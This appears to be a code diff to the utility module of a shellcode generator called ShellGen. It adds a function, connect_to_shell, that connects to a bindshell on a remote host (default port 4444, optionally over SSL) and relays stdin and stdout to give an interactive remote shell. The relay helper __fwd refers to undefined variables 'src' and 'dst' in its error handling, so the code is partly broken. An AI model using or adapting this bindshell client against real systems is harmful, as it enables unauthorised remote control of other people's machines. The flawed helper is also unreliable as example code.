@@ -28,12 +28,18 @@ Utility functions for ShellGen.
 @var  default_bad_chars: Default list of bad characters for encoders.
 """
 
-from __future__ import absolute_import
+from __future__ import absolute_import, with_statement
 from .base import *
 
+import os
 import re
 import random
+import socket
+import ssl
 import struct
+import sys
+import thread
+import threading
 import warnings
 
 from os import listdir, path
@@ -45,6 +51,7 @@ __all__ = [
     "is_stack_balanced", #"uses_stack", "uses_heap", "uses_seh",
     "iter_shellcode", "find_shellcode", "print_shellcode_tree",
     "load_bytecode_from_source", "load_bytecode_from_dump",
+    "connect_to_shell",
 ]
 
 #-----------------------------------------------------------------------------#
@@ -728,6 +735,76 @@ def _load_bytecode_from_dump(input):
 
     # Assume it's a raw binary dump and return it unchanged.
     return data
+
+#-----------------------------------------------------------------------------#
+
+def connect_to_shell(hostname, port = 4444, use_ssl = False):
+    """
+    Connect to the bindshell at the given host and port.
+
+    @type  hostname: str
+    @param hostname: Hostname or IP address to connect to.
+
+    @type  port: int
+    @param port: Port number to connect to.
+
+    @type  use_ssl: int
+    @param use_ssl: C{True} to connect using SSL,
+        C{False} to establish a plaintext connection.
+
+    @raise socket.error: Connection error.
+    """
+    evt = threading.Event()
+    evt.clear()
+    s = socket.socket()
+    try:
+        s.connect( (hostname, port) )
+        try:
+            if use_ssl:
+                s = ssl.wrap_socket(s)
+            stdout = sys.stdout
+            def write(data):
+                stdout.write(data)
+                try:
+                    stdout.flush()
+                except:
+                    pass
+            thread.start_new_thread(__fwd, (evt, s.recv, write))
+            thread.start_new_thread(__fwd, (evt, sys.stdin.read, s.sendall))
+            evt.wait()
+        finally:
+            try:
+                s.shutdown(2)
+            except Exception:
+                pass
+    finally:
+        try:
+            s.close()
+        except Exception:
+            pass
+
+def __fwd(evt, read_fn, write_fn):
+    try:
+        try:
+            while True:
+                data = read_fn(1)
+                if not data:
+                    break
+                write_fn(data)
+        except:
+            try:
+                src.close()
+            except:
+                pass
+            try:
+                dst.close()
+            except:
+                pass
+    finally:
+        try:
+            evt.set()
+        except:
+            pass
 
 #-----------------------------------------------------------------------------#
 
